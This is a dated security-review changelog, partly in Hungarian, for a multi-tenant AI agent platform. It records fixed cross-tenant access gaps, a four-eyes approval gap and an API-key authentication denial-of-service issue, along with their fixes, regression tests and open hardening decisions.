  - Találtam egy Separation-of-Duties (T2) rést a capability-verzió jóváhagyásban. Az `approveVersion` a "más kolléga hagyja jóvá, mint aki a linket beállította" kaput CSAK az ELSŐ verziónál kényszerítette ki (`if (!ctx.activeVersion)`). Minden KÉSŐBBI verziót a beállító (aki a spec-URL-t választotta ÉS az API-kulcsot birtokolja) egyedül élesíthetett — épp azokat a kockázatos változásokat (pl. új írási végpont), amelyeket a rendszer szándékosan visszatart az automatikus átvételtől, hogy emberi kapun menjenek át. A kettős kontroll így pont a legkockázatosabb inkrementális bővítéseknél lyukadt ki.
- Fix applied:
  - Az `approveVersion` a `requireDifferentActor(source.createdById, actor)` kaput MINDEN verzióra kikényszeríti (nem csak az elsőre); a hibaüzenet verzió-állapottól függ, a logika egységes. A superadmin (`sodExempt`) kivétel változatlanul megmarad, auditált `sod_bypass` metaadattal.
  - Új regressziós teszt (`self-updating-connector-lifecycle.test.ts`): v1-et másik kolléga hagyja jóvá; egy új `POST /customers` írási végpontot hozó v2-t a beállító NEM élesíthet (`SEPARATION_OF_DUTIES`), superadmin beállító viszont igen.
- Business impact:
  - Az önfrissítő connector lényege, hogy egy partner API-képességei emberi felügyelet mellett, biztonságosan követhessék a partner változásait. Ha a connectort beállító személy egyedül élesíthet minden későbbi képesség-bővítést, akkor egyetlen belső szereplő — miután egy kolléga egyszer megbízhatónak minősítette a partnert — önállóan kiterjesztheti a connector írási hatókörét (adatmódosítás, kifizetés-jellegű hívások) egy második jóváhagyó nélkül. A javítás a négy-szem-elvet a teljes életciklusra kiterjeszti, összhangban a platform többi SoD-invariánsával (approver ≠ requester), a superadmin vészkijárat auditált megtartásával.
- Verification:
  - `npm run test:self-updating-connector-lifecycle` (új SoD-regresszióval) és `npm run test:self-updating-connector` from `app/`
  - `npx tsc --noEmit` from `app/`
  - `npx eslint src/domain/connector-self-update/self-update-service.ts scripts/self-updating-connector-lifecycle.test.ts` from `app/`
  - `/code-review` skill (Standards + Spec, két párhuzamos ügynök): mindkét tengely tiszta; nincs hard violation, nincs spec-defektus.
- Decisions raised (not auto-fixed):
  - D1 — A `rollback` egy KORÁBBAN jóváhagyott (már vetett) verziót állít vissza, és jelenleg nincs rajta SoD-kapu. Alacsony kockázatú (nincs új capability), de a teljes szimmetriához megfontolható ugyanaz a `requireDifferentActor`.
  - D2 — Az untrusted, partner-hoszttolt OpenAPI-spec YAML-parse-a méret-cap (5 MiB) alatt is ki van téve a "billion-laughs" alias-expanziós memória/CPU-terhelésnek (js-yaml nem korlátozza az alias-mélységet). Emberi triggerű, megbízhatónak minősített URL-en, ezért alacsony súlyú, de egy alias/anchor-számláló előszűrő olcsó keményítés lenne a megosztott `openapi-config-extractor`-ban.
  - D3 — Az auto-approve út (tenant opt-in + read-only additív diff) szándékosan a beállító egyedüli, `approvedById: null` élesítését is megengedi — ez a feature dokumentált tervezése; a kockázatos (write/breaking/auth) változások továbbra is az emberi SoD-kapun mennek át.

## 2026-07-15 - Clerk meghívó-onboarding / tenant-membership provisioning

- Reviewed modules:
  - `app/src/app/actions/platform.ts` Clerk- és helyi meghívó-kibocsátás/visszavonás
  - `app/src/app/api/webhooks/clerk/route.ts`, `app/src/auth/clerk-provider.ts`, `app/src/auth/clerk-user-sync.ts` hitelesített provider-életciklus és identitásszinkron
  - `app/src/domain/iam/iam-service.ts`, `app/src/repositories/postgres/iam-repository.ts`, `tenant-repository.ts`, valamint az `Invitation` / `TenantMembership` adatmodell
  - `docs/specs/AI-Agent-Platform-Feature-Spec-IAM-RBAC-done.md` (§0, §3.2, §5, §7, §8, §9)
- Result:
  - Találtam három éles, P1-szintű kockázatot. A Clerk `publicMetadata.role` közvetlenül aktív belső szereppé vált, így egy provider-oldali hiba vagy rosszul kötött meghívó megkerülhette a Control Plane meghívó- és auditkapuját. A Clerk-meghívó elfogadása nem hozott létre `TenantMembership`-et, ezért a felhasználó nem kapott aktív tenant-kontektsust. Végül a webhook azonos e-mailhez tartozó ÖSSZES pending meghívót beváltottra jelölte, lejárat-, tenant- és konkrét meghívó-kötés nélkül: ez más tenant onboardingját tehette használhatatlanná.
  - Melléklelet: a tokenes meghívó-beváltás read-check-write sorrendje párhuzamos kéréseknél két beváltást/auditot is megengedhetett.
- Fix applied:
  - A Clerk többé nem dönt szerepkörről. Csak igazolt elsődleges e-mailt szinkronizál; az új identitás `pending` és szerep nélküli, amíg a helyi, pontos meghívó nem jogosítja fel.
  - A helyi meghívó előbb jön létre, és az UUID-ja a Clerk szerveroldali metadatajába kerül. A hitelesített webhook kizárólag ezt az egy, e-mailben egyező, nem lejárt, `pending` meghívót fogadhatja el; e-mail-alapú tömeges beváltás nincs. A helyi `Invitation` tárolja a Clerk invitation ID-t is, a normál visszavonás mindkét oldalt megpróbálja visszavonni.
  - Sikeres beváltás idempotens `TenantMembership.upsert`-tel létrehozza/aktiválja a tenant-tagságot és a tenant-attribútumú auditot. A `claimPendingRedemption` és a `revokePending` compare-and-set csak egy párhuzamos beváltást vagy visszavonást enged nyerni; retry esetén nem készül második jogosultság vagy auditesemény.
  - Új `clerk-invitation-membership.test.ts` fedi a pontos tenant-kötést, e-mail-eltérést, lejáratot és webhook-újraküldést.
- Business impact:
  - A meghívás most valóban azt az egy ügyfél-teret és szerepet adja, amelyet az admin kijelölt — sem a külső identitásszolgáltató metadataja, sem egy azonos e-mailes másik tenant-meghívó nem adhat hozzáférést. Ez megakadályozza az onboarding során történő jogosultság-emelést és a másik ügyfél beléptetési folyamatának megrongálását, miközben az új munkatárs azonnal a helyes tenantban kezdhet dolgozni.
- Verification:
  - `npm run test:clerk-invitation-membership`, `npm run test:iam-policy`, `npm run test:iam-tenant-boundary`, `npm run test:tenant-management`, `npm run test:tenant-isolation` from `app/`
  - `npx tsc --noEmit`; célzott `npx eslint`; `DIRECT_URL=... npx prisma validate`; `git diff --check`
- Decisions raised (not auto-fixed):
  - D1 — Ha a helyi visszavonás után a Clerk API átmenetileg hibázik, a helyi kapu fail-closed marad és hiba-napló készül, de automatikus provider-oldali retry/outbox még nincs. Szabályozott telepítéshez érdemes erre rövid retry- és reconcile-jobot bevezetni.

## 2026-07-14 - Agent API-kulcs hitelesítés skálázhatósága és O(n) bcrypt-DoS

- Reviewed modules:
  - `app/src/auth/agent-api-key.ts` a gép-gép (service-account) Bearer-token belépőpont és scope-őr
  - `app/src/repositories/postgres/agent-repository.ts` `authenticateApiKey` kulcs-ellenőrzés, valamint a kulcs-kiadó utak (`create`, `rotateApiKey`, `issueEphemeralKey`)
  - `app/src/app/api/v1/agent/tools/route.ts`, `app/src/app/api/v1/agent/tickets/route.ts` és a többi agent-facing API-route, amely erre a hitelesítésre épül
  - `app/prisma/schema.prisma` `AgentApiKey` modell
- Result:
  - A tenant- és scope-modell rendben van: a kulcs egy agent-identitáshoz és egy fix scope-listához kötött, a route-ok fail-closed módon `requireAgentScope`-ot kérnek, a titok bcrypt-tel van tárolva. NEM találtam tenant-határ- vagy jogosultság-rést ezen a felületen.
  - Találtam viszont egy éles használatot blokkoló skálázhatósági (és ezzel DoS-) hibát. A `authenticateApiKey` MINDEN aktív API-kulcsot betöltött az ÖSSZES agentről/tenantről, majd sorban `bcrypt.compare`-t futtatott rájuk, amíg egyezést nem talált. A bcrypt (cost 10) szándékosan lassú (~50-100 ms/hívás), így minden egyes agent-API-hívás költsége az aktív kulcsok számával lineárisan nőtt: pár száz agentnél már másodperces hitelesítési késleltetés, ezresnél gyakorlatilag használhatatlan — és egy támadó érvénytelen tokenekkel szándékosan a teljes O(n) bcrypt-szkennt kényszerítheti ki (CPU-kimerítés). Ez a demóban (kevés kulcs) nem látszik, de pontosan az enterprise-skálán válik éles-blokkolóvá.
- Fix applied:
  - Új közös primitív: `app/src/lib/agent-api-key-hash.ts` — `isAgentApiKeyFormat` (előtag-őr) és `deriveAgentApiKeyLookupHash` (szerveroldali sóval képzett determinisztikus HKDF-SHA-256 kereső-lenyomat). A nyugalmi titok TOVÁBBRA is bcrypt; a HKDF kizárólag gyors, egyedi-indexelt megkeresésre szolgál, és az adatbázis-szivárgás nem ad offline ellenőrzőt a nyers kulcshoz.
  - Séma + `0006_agent_api_key_lookup_hash` migráció: nullable `lookup_hash` oszlop egyedi indexszel. A hitelesítés így O(1) `findUnique`-kal megtalálja a pontos kulcssort, majd EGYETLEN bcrypt-ellenőrzést végez mélységi védelemként.
  - Minden kulcs-kiadó út (`create`, `rotateApiKey`, `issueEphemeralKey`) feltölti a kereső-hash-t. A migráció ELŐTT kiadott kulcsok visszafelé kompatibilisek: egy szűkített legacy-szkenn (csak a `lookup_hash IS NULL` sorokon) hitelesíti őket, és első sikeres használatkor feltölti a kereső-hash-üket, így a következő hitelesítés már a gyors úton fut. A legacy-halmaz monoton nullára csökken.
- Business impact:
  - A gép-gép API a platform végrehajtási felülete (tool-hívás, ticket-létrehozás): ha a hitelesítés lelassul vagy CPU-kimerítéssel megbénítható, az az egész agent-flotta leállását jelentheti. A javítás konstans idejűvé teszi a hitelesítést a kulcsok számától függetlenül, ezzel eltávolít egy éles-blokkoló skálázhatósági falat és egy olcsó DoS-felületet — a biztonsági tulajdonságok (bcrypt nyugalmi titok, scope-kötés, lejárat/visszavonás tisztelete) csökkentése nélkül.
- Verification:
  - `npm run test:agent-api-key-hash` (új determinisztikus, DB-mentes teszt: determinizmus, tárolás=keresés invariáns, ütközés-mentesség, formátum-őr)
  - `npx tsc --noEmit` from `app/`
  - `npx eslint src/lib/agent-api-key-hash.ts src/repositories/postgres/agent-repository.ts scripts/agent-api-key-hash.test.ts` from `app/`
  - `npx prisma validate` (séma érvényes; a `prisma generate` a `lookupHash` mezővel újragenerált)
  - `git diff --check`
- Decisions raised (not auto-fixed):
  - D1 — A `/api/v1/internal/dispatch-cycle` route a `DISPATCHER_CONTROL_TOKEN` statikus titkot sima `!==`-vel hasonlítja (nem konstans idejű). Hálózaton át a timing-oracle gyakorlatilag nem kihasználható, de egy `crypto.timingSafeEqual`-ra váltás olcsó keményítés lenne.
  - D2 — A migrációt éles/teszt Neon adatbázisra még alkalmazni kell (`prisma migrate deploy`); a PR csak a migrációs fájlt tartalmazza, adatbázis-változtatást nem futtattam.

## 2026-07-14 - Proactive monitor admin és background escalation tenant-határ

- Reviewed modules:
  - `app/src/app/actions/monitor.ts` monitor lista, részletek, szüneteltetés/folytatás/visszavonás, futásnapló, jelek és dry-run Server Action belépőpontjai
  - `app/src/domain/monitor/monitor-service.ts` tenant-scope érvényesítés, monitor sweep, ticket-eszkaláció és connector-count collector belépési sorrendje
  - `app/src/repositories/postgres/monitor-repository.ts`, `app/src/domain/monitor/collectors/*.ts`, `app/src/domain/dispatcher/dispatcher-service.ts`, `app/src/domain/playbook/process-definition-service.ts` és `app/prisma/schema.prisma` perzisztencia-, végrehajtás- és folyamat-trigger határai
  - `docs/specs/AI-Agent-Platform-Feature-Spec-Proactive-Monitor-done.md` (§4, §5, §9) és a Next.js Server Action biztonsági útmutatója
- Result:
  - Találtam cross-tenant IDOR-osztályt a monitor admin felületen. A `listMonitors` nem adott tenant-szűrőt a repositorynak, az egyedi monitorra épülő actionök pedig a hívó szerepét ellenőrizték, de a globális `monitorId`-t nem kötötték az aktív tenanthez. Egy tenant viewer/admin/operator ismert idegen UUID-val olvashatta a másik tenant monitor-konfigurációját, jel-payloadjait és futásnaplóját, illetve admin joggal szüneteltethette, folytathatta, módosíthatta vagy visszavonhatta azt. A dry-run ráadásul tenant-specifikus ticket- és connector-jeleket számolhatott ki.
  - Találtam egy background végrehajtási kockázatot is: létrehozáskor vagy módosításkor a `escalateAgentId` nem volt tenant-elérhetőséghez kötve. Egy másik tenant aktív agentjének ismert UUID-ja így egy saját tenant monitor ticketjét külső agenthez rendelhette; a dispatcher az agent tényleges tenantja szerinti model-budgetet és futtatási kontextust használja. Ez költség- és adatkezelési határátlépés lehetett.
- Fix applied:
  - A `MonitorService` minden emberi, azonosító-alapú művelete explicit `tenantId`-t kér, és a célmonitort fail-closed, opak `Monitor not found` választ adó domain-kapuval ellenőrzi. A listázás a repositoryig tenant-szűrt.
  - A monitor actionök az aktív tenantot továbbítják minden olvasásnál és életciklus-változtatásnál. Létrehozás és eszkalációs-agent módosítás előtt kizárólag a saját vagy platform-szintű megosztott agent fogadható el.
  - A workerben futó sweep is újraellenőrzi az eszkalációs agent elérhetőségét, ezért egy régi vagy közvetlenül betöltött hibás konfiguráció sem indíthat cross-tenant background agent-futást. A jel ettől még nem vész el: érvénytelen agentnél emberi backlog ticketként jön létre.
  - A `monitor-engine.test.ts` új regressziós tesztje ellenőrzi, hogy idegen monitorhoz nem jut el update/revoke/run/signal/dry-run repository-hívás, míg azonos tenantnál az update működik; továbbá hibás agent-kapcsolatnál backlog fallbacket és csendes sweepnél felesleges agent-lookup hiányát is lefedi.
- Business impact:
  - A proaktív monitorok SLA-küszöböket, határidőket, ticket-állapotokat, connector-mennyiségeket és operációs értesítési konfigurációt tartalmazhatnak. A változtatás megakadályozza, hogy egy ügyfél betekintsen egy másik ügyfél ilyen üzemi adataiba vagy leállítsa a felügyeletét.
  - Az eszkalációk csak az adott ügyfél által elérhető agentre futhatnak, így a feladatok, model-költségek és agent-képességek az arra jogosult szervezet határán maradnak — beleértve a régi hibás konfigurációk biztonságos kezelését is.
- Verification:
  - `npm run test:monitor` from `app/`
  - `npx eslint src/domain/monitor/monitor-service.ts src/app/actions/monitor.ts src/domain/index.ts scripts/monitor-engine.test.ts` from `app/`
  - `npx tsc --noEmit` from `app/`
  - `git diff --check`

## 2026-07-13 - Persistent agent memory: tenant boundary / approval / rollback surface

- Reviewed modules:
  - `app/src/domain/memory/memory-approval-service.ts` candidate approval, ticket routing, T2 write-gate writes, and chunk-target mutation path
  - `app/src/app/actions/platform.ts` memory candidate actions, memory overview/project-key reads, maintenance trigger, and manifest rollback action
  - `app/src/domain/memory/memory-proposal-service.ts`, `memory-maintenance-service.ts`, `memory-retrieval-service.ts`, and `memory-runtime-helper.ts` capture/retrieval scope propagation
  - `app/src/repositories/postgres/memory-repository.ts`, `app/src/lib/tenant-reachability.ts`, `app/src/lib/agent-detail-page-data.ts`, and `app/prisma/schema.prisma` persistence and tenant-scope contracts
  - `docs/specs/agent-memory-persistent-cross-conversation-spec.md` (§2.1, §6, §8, §9.3, NF2, S1, S6)
- Result:
  - Found a cross-tenant IDOR class across the memory administration surface. The project-key list, memory overview, maintenance trigger, and rollback action authenticated an active tenant user but fetched the target agent by global ID without checking that it was reachable from the active tenant. A tenant operator who knew another tenant's agent ID could read its memory project keys and curated chunks, initiate maintenance proposals, or roll back its memory manifest.
  - Found the same boundary flaw in candidate lifecycle actions. The approval service derived tenant authority from legacy `User.tenantId`, rather than the request's active tenant membership / superadmin-assume context; reject, modify, and ticket creation lacked a candidate tenant check. The ticket path also created training tickets without `tenantId`, weakening later ticket-scope enforcement.
  - Found an authorization-adjacent arbitrary-target write. A memory proposal's `supersedes` chunk ID is model-controlled input, but approval mutated the target by global ID without confirming it belonged to the candidate's memory, agent, tenant, project, and workstream. A known foreign chunk UUID could therefore be archived, deleted, demoted, or superseded through an otherwise authorized approval.
- Fix applied:
  - Memory actions now assert the target agent is reachable from the active tenant before reading its memory or invoking maintenance/rollback.
  - `MemoryApprovalService` now accepts the active tenant id and role explicitly, uses them for authorization, and fail-closes candidate lifecycle operations unless both the candidate and its agent are in scope. It no longer treats the stale single-tenant user profile as authority.
  - Memory-candidate training tickets are explicitly tenant-attributed; ticket approval verifies both ticket and candidate tenant scope.
  - Before a write-gate token is issued, candidate target chunks are validated against the full memory/agent/tenant/project/workstream scope. Out-of-scope targets are rejected before any mutation or token consumption.
  - Extended `memory-approval-service.test.ts` with tenant-attributed ticket and cross-scope target regression coverage.
- Business impact:
  - Persistent memory stores project decisions, constraints, and operational context that may re-enter future agent prompts. The fix stops one customer from viewing, changing, or rolling back another customer's retained agent knowledge, and prevents a prompt-influenced agent from using a foreign chunk ID to alter another customer's context.
  - Approval records and training tickets now retain the tenant that authorized them, providing a trustworthy audit trail for regulated or multi-tenant deployments.
- Verification:
  - `npm run test:memory-approval` from `app/`
  - `npx tsc --noEmit` from `app/`
  - `npx eslint src/domain/memory/memory-approval-service.ts src/app/actions/platform.ts scripts/memory-approval-service.test.ts` from `app/`
  - `git diff --check`

## 2026-07-11 - Ticket board / workspace file tenant boundary

- Reviewed modules:
  - `app/src/app/actions/platform.ts` ticket board actions (`listTickets`, `listBoardAssignees`, `createBoardTicket`, `dispatchBoardTicket`, `listBoardTickets`, `getTicket`, `getTicketTransitions`)
  - `app/src/app/api/v1/tickets/[id]/workspace/files/route.ts` ticket workspace list/download/signed-url/upload route
  - `app/src/app/api/v1/conversations/[id]/workspace/files/route.ts` conversation workspace list/download/signed-url/upload route
  - `app/src/domain/file-editor/workspace-storage.ts` storage key and quota behavior
  - `app/src/domain/agent/general-task-runtime.ts` and `app/src/domain/agent/agent-chat-runtime.ts` runtime workspace tenant-key usage
- Result:
  - Found a cross-tenant IDOR class in the ticket/workspace surface. The workspace file routes only required a logged-in user, loaded tickets/conversations by global ID, and derived the storage prefix from legacy `user.tenantId` instead of the active tenant context. A user who knew another tenant's ticket or conversation ID could list, download, request signed URLs for, or upload files against that workspace route.
  - Found related board-ticket tenant gaps. `listTickets`, `listBoardTickets`, `getTicket`, `getTicketTransitions`, and `dispatchBoardTicket` authenticated the caller but did not consistently scope the target ticket to the active tenant. `listBoardAssignees` listed globally active users, and human ticket creation accepted any active user ID, allowing cross-tenant user discovery and assignment.
- Fix applied:
  - Added `resolveWorkspaceTenantKey` as a small fail-closed workspace resource guard. HTTP workspace access now requires active tenant auth: `viewer` for list/download/signed-url and `operator` for upload. The route returns an opaque 404 for cross-tenant or tenantless legacy resources and uses the active tenant key only after the resource tenant matches.
  - Ticket lists and board lists now pass `tenantId: activeTenantId`; single-ticket read/transition lookup and dispatch now assert `ticket.tenantId === activeTenantId` before returning data or triggering work.
  - Board human assignees now come from active `TenantMembership` rows in the selected tenant, not global users. Human ticket creation requires an active membership in the active tenant.
  - Added `scripts/workspace-resource-access.test.ts` and `test:workspace-resource-access` for the storage-key tenant invariant, including cross-tenant and tenantless legacy denial.
- Business impact:
  - Protects customer work artifacts: ticket and conversation workspaces may contain uploaded documents, generated files, tool outputs, and deliverables. These are tenant-owned business records and must not be accessible by knowing an ID from another tenant.
  - Prevents support/operations users in one tenant from seeing another tenant's tickets, transitions, assignee population, or accidentally dispatching another tenant's agent work.
  - Aligns the board and workspace APIs with the platform's enterprise tenant model: the active tenant membership is the authority boundary, not legacy single-tenant user metadata.
- Verification:
  - `npm run test:workspace-resource-access --prefix app`
  - `npm run test:conversation-session --prefix app`
  - `npm run test:tenant-isolation --prefix app`
  - `npx eslint 'src/app/api/v1/tickets/[id]/workspace/files/route.ts' 'src/app/api/v1/conversations/[id]/workspace/files/route.ts' src/app/actions/platform.ts src/lib/workspace-resource-access.ts scripts/workspace-resource-access.test.ts` from `app/`
  - `npx tsc --noEmit` from `app/`
- Decisions raised (not auto-fixed):
  - D1 — Tenantless legacy ticket/conversation workspaces are now denied through these HTTP routes. If the product needs migration access for old `tenantId = null` workspaces, build an explicit admin migration/export flow rather than letting tenant users reach null-tenant storage implicitly.

## 2026-07-10 - Sandbox App Registry / preview-token isolation / archive tenant boundary

- Reviewed modules:
  - `app/src/domain/sandbox/sandbox-app-service.ts` (create/version/activate/list/get/export/preview/archive, tenant gate, preview token serve path)
  - `app/src/domain/sandbox/preview-token.ts` (HMAC-signed preview payload and expiry)
  - `app/src/app/api/sandbox-apps/preview/route.ts` and `app/src/app/api/sandbox-apps/[appId]/export/route.ts` (cookieless preview/export serving headers)
  - `app/src/repositories/postgres/sandbox-app-repository.ts` (tenant-scoped listing/metrics, version persistence)
  - `app/src/app/actions/platform.ts` sandbox app server actions
  - `app/scripts/sandbox-app-registry.test.ts` and `app/src/lib/sandbox-csp.ts` coverage surface
- Result:
  - The registry core has a production-appropriate shape for A0 single-file apps: immutable versions, deterministic content hashes, HTML linting before persistence, short-lived signed preview URLs, cookieless preview serving, CSP sandboxing without `allow-same-origin`, and tenant checks inside the domain service before read/export/preview/archive operations.
  - Found one enterprise tenant-boundary gap in the human archive action. `create`, `version`, `activate`, `list`, `get`, `metrics`, and `previewUrl` all pass `requireTenantRole(...).activeTenantId` into the sandbox service, but `archiveSandboxApp` reloaded `getCurrentUser()` and passed the legacy `user.tenantId`. In a migrated multi-tenant account, a user operating in tenant B could be authorized by tenant B membership while the archive service checked tenant A from the legacy profile. That can either wrongly deny the active tenant's own archive operation or archive a different tenant's app if the caller knows its id.
- Fix applied:
  - `archiveSandboxApp` now uses the same active tenant context as the rest of the sandbox app actions: `requireTenantRole('operator')` returns both `user.user.id` and `user.activeTenantId`, and those values are passed directly into the domain service.
  - Added a deterministic archive tenant-boundary regression in `sandbox-app-registry.test.ts`: cross-tenant archive is denied with `APP_NOT_FOUND_OR_FORBIDDEN` and `sandbox_app.access_denied`, while same-tenant archive succeeds and emits `sandbox_app.archive`.
- Business impact:
  - Aligns sandbox app lifecycle control with the selected customer tenant, which is critical because mini-apps are executable customer artifacts. Operators can no longer accidentally apply lifecycle changes based on stale legacy tenant metadata instead of the tenant they are administering.
  - Preserves the audit story for enterprise customers: denied cross-tenant archive attempts and successful archives remain explicit governance events.
- Verification:
  - `SANDBOX_APP_STUB=true node --import tsx scripts/sandbox-app-registry.test.ts` from `app/`
  - `node --import tsx scripts/sandbox-csp.test.ts` from `app/`
  - `npx eslint src/app/actions/platform.ts scripts/sandbox-app-registry.test.ts src/domain/sandbox/sandbox-app-service.ts src/domain/sandbox/preview-token.ts src/app/api/sandbox-apps/preview/route.ts 'src/app/api/sandbox-apps/[appId]/export/route.ts'` from `app/`
  - Note: the package-script form `npm run test:sandbox-app --prefix app` and `npm run test:sandbox-csp --prefix app` hit the local sandbox's `tsx` IPC pipe restriction (`listen EPERM`); the same tests pass via `node --import tsx`.
- Decisions raised (not auto-fixed):
  - D1 — Preview tokens are not currently single-use. They are short-lived and bound to `tenantId + appId + version + contentHash`, which is acceptable for preview links, but stricter regulated deployments may want replay tracking or a nonce table.
  - D2 — Sandbox audit attribution is mostly derived from target references today. If enterprise reporting needs direct tenant filtering for every sandbox event, the service should pass `tenantId` explicitly on every `audit.append` call rather than relying on derived attribution.
## 2026-07-09 - Conversation Session / Agent Chat tenant-határ + workspace fájl API

- Áttekintett modulok:
  - `app/src/domain/conversation/conversation-service.ts` (conversation lookup, append,
    promoteToTicket, audit)
  - `app/src/domain/agent/agent-chat-runtime.ts` és `app/src/domain/agent/wiki-runtime.ts`
    (chat/wiki conversation indítás, stream, task ticket, report/wiki ticket)
  - `app/src/app/actions/platform.ts` conversation/wiki server actionök
  - `app/src/app/api/v1/conversations/[id]/workspace/files/route.ts` és
    `app/src/app/api/v1/tickets/[id]/workspace/files/route.ts`
  - `app/src/repositories/postgres/conversation-repository.ts`, `app/prisma/schema.prisma`
    Conversation/Message tenant- és retention-mezők
- Eredmény:
  - A ConversationService alapvető tenant-scope mintája jó irányú: ha a hívó tenantot ad,
    a beszélgetés olvasása/archiválása/törlése opak `Conversation not found` hibával
    fail-closed, és cross-tenant olvasási kísérlet auditot ír.
  - Találtam egy AgentChat/Wiki runtime tenant-rést: a chat és wiki belépők az agentet
    globális `findByIdWithDetails(agentId)` hívással töltötték, miközben a tenantot csak a
    conversationre adták át. Multi-tenant éles környezetben egy tenant operátora idegen
    tenant agent ID-ját célba vehette volna, ami prompt-, modelConfig-, memory-/recipe- és
    capability-kitettséget, illetve téves ticket/delegációs mellékhatásokat okozhat.
  - Találtam egy workspace fájl API tenant-rést is: a conversation/ticket workspace fájl
    route-ok csak `getCurrentUser()`-t használtak, globálisan oldották fel a conversationt /
    ticketet, és a storage tenant-kulcsot a legacy `user.tenantId` mezőből képezték az aktív
    tenant-kontextus helyett. Ez nem elégséges enterprise izoláció fájl-listázás,
    letöltés/signed URL és feltöltés útvonalon.
  - A `promoteToTicket` action az első olvasást tenant-szűrten végezte, de a domain
    promóciós hívásba nem vitte tovább a tenantId-t. Ez TOCTOU/IDOR jellegű defense-in-depth
    rés volt a conversationből ticketet nyitó útvonalon.
- Javítás:
  - AgentChatRuntime és WikiAgentRuntime a közös `isAgentReachableFromTenant` szabályt
    alkalmazza minden human-facing chat/wiki/task/report belépőn: megosztott agent elérhető,
    saját tenant agent elérhető, cross-tenant agent opak `Agent not found`.
  - A chat/wiki message append hívások ugyanazt a tenantId-t viszik tovább a ConversationService
    felé, így nem csak az előzetes lookup, hanem maga az append is tenant-scope-olt.
  - A conversation és ticket workspace fájl API-k `requireTenantRole('viewer')`-t kérnek
    olvasásra/listázásra, `requireTenantRole('operator')`-t feltöltésre, és `findFirst({ id,
    tenantId: activeTenantId })` alapján oldják fel a cél objektumot. A storage kulcs az
    objektum tenantjához / aktív tenantjához kötött, nem legacy user mezőhöz.
  - A `ConversationService.promoteToTicket` tenantId-ja kötelező lett; a production action az
    aktív tenantot adja át, a demó/acceptance globális agent útvonal explicit `null`-t.
  - Új determinisztikus teszt: `scripts/agent-chat-tenant-boundary.test.ts` (sendMessage,
    sendMessageStream, createTaskTicket cross-tenant deny mellékhatás előtt), valamint új
    ConversationSession regresszió a cross-tenant promote tiltásra.
- Üzleti hatás:
  - Megakadályozza, hogy egy ügyfél operátora egy másik ügyfél agentjével vagy annak
    workspace fájljaival dolgozzon pusztán ID ismeretében. Ez különösen fontos, mert a
    chat runtime a platform legérzékenyebb prompt-kontekstusát állítja össze (memory,
    knowledge, tool history, attachment workspace), és a workspace fájl API közvetlen
    dokumentum-hozzáférést ad.
  - Az aktív tenant-kontextus lesz az egységes auditálható határ a chat, wiki, ticket és
    fájlműveletek között, ami ügyfél-tenant izoláció és compliance review szempontból
    védhetőbb kontroll.
- Verifikáció:
  - `npm run test:agent-chat-tenant-boundary --prefix app`
  - `npm run test:conversation-session --prefix app`
  - `npm run test:chat-tool-history --prefix app`
  - `npx eslint src/domain/agent/agent-chat-runtime.ts src/domain/agent/wiki-runtime.ts
    src/domain/conversation/conversation-service.ts src/app/actions/platform.ts
    src/app/api/v1/conversations/[id]/workspace/files/route.ts
    src/app/api/v1/tickets/[id]/workspace/files/route.ts
    scripts/agent-chat-tenant-boundary.test.ts scripts/conversation-session.test.ts`
  - `git diff --check`
  - Megjegyzés: a teljes `npx tsc --noEmit` jelenleg nem zöld a repo meglévő
    provisioning/connector-template típushibái miatt (`TemplateDescriptor.connectorType`,
    provisioning panel template metadata, `ProvisioningErrorCode`); ezek nem a most
    módosított conversation/chat/workspace fájlokból erednek.
- Nyitott döntések (nem auto-javítva):
  - D1 — A workspace fájl API jelenleg tenant-szintű viewer/operator jogosultságot használ,
    nem conversation/ticket tulajdonosi vagy assignee-szintű ACL-t. Ha egy tenanton belül is
    szigorúbb adatmegosztás kell, külön per-resource access policy szükséges.
  - D2 — A `Document` modellnek továbbra sincs saját `tenantId` mezője; a chat-csatolmányok
    documentId alapján töltődnek. Ez kapcsolódik a 2026-07-07 KB review D1 döntéséhez, és
    séma-szintű tenant-attribúcióval lenne zárható teljesen.

## 2026-07-07 - Knowledge Base tenant-határ (dokumentum-gate + megosztás + review)

- Áttekintett modulok:
  - `app/src/domain/knowledge-base/knowledge-base-service.ts` (requestDocument /
    approveDocument / rejectDocument / listPendingDocuments / listPendingArtifacts /
    getArtifactReview / publishArtifact + draft-artifact flow)
  - `app/src/app/actions/platform.ts` KB server actionök (requestKbDocument,
    approveKbDocument, rejectKbDocument, listKbDocumentRequests, getKbArtifactReview,
    processDocumentForWiki, listDocumentsForAgent, shareKnowledgeBaseWithAgent,
    unshareKnowledgeBaseFromAgent, getKnowledgeBaseSharing, deleteKbDocument)
  - `app/src/repositories/postgres/knowledge-repository.ts` (searchChunks / listIndex /
    getPageChunks retrieval scope), `app/src/domain/tool-broker/tool-broker-service.ts`
    `resolveKbConnectorScope` + kb_search/kb_list_index/kb_get_page
  - `app/src/auth/tenant-context.ts` (`requireTenantRole`), `app/prisma/schema.prisma`
    Document / KnowledgeArtifact / KnowledgeChunk / Agent tenant-mezők
- Eredmény:
  - A KB retrieval-út (kb_search és a navigáció) helyesen a Tool Broker fail-closed
    capability-kapuján és a connector-scope-on át fut, PUBLISHED-only chunkokra.
  - Talált egy cross-tenant IDOR-osztályt a KB admin-felületen. A KB actionök a hívó
    aktív tenant-szerepét hitelesítették (`requireTenantRole`), de a cél `agentId` /
    `documentId` / `ticketId` / `targetAgentId` feloldása globális `findById` volt,
    tenant-szűrő NÉLKÜL. Multi-tenant telepítésen ez egy tenant operátorának/approverének
    engedte, hogy (a) egy MÁSIK tenant agentjének tudásbázis-review tartalmát (extracted
    text, OKF file-tree) olvassa (`getKbArtifactReview`, `listKbDocumentRequests`),
    (b) idegen dokumentumot csatoljon idegen agent KB-jéhez a jóváhagyási kapu megkerülésével
    (`processDocumentForWiki`) vagy azon át (`requestKbDocument`), (c) idegen KB-jóváhagyást
    hagyjon jóvá/utasítson el (`approve/rejectKbDocument`), (d) cross-tenant KB-t osszon meg
    vagy szüntessen meg (`share/unshare/deleteKbDocument`). A demóban minden agent globális
    (tenantId null), ezért ma nem éles — de pontosan a multi-tenant enterprise használatban
    válik kihasználhatóvá (ugyanaz a mintázat, mint a 2026-07-07 Tool Broker és IAM review).
- Javítás:
  - Új közös primitív: a `isAgentReachableFromTenant` / `filterAgentsByTenant` a Tool
    Brokerből egy megosztott `app/src/lib/tenant-reachability.ts` modulba került (a Tool
    Broker re-exportál, a meglévő teszt változatlan) — így a KB ÉS a Tool Broker EGY
    tenant-invariánst használ (megosztott/null agent bárhonnan elérhető, cross-tenant SOHA).
